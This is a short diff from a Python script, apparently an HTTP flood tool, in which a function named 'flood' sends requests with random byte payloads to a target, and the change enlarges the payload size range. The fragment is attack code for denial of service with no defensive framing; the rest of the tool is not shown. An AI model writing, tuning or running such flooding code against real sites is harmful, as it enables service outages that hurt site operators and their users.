@@ -21,7 +21,7 @@ headers = {
 
 
 def flood(target):
-    payload = str(random._urandom(random.randint(10, 150)))
+    payload = str(random._urandom(random.randint(10, 500)))
     try:
         r = requests.get(target, params=payload, headers=headers, timeout=4)
     except requests.exceptions.ConnectTimeout:
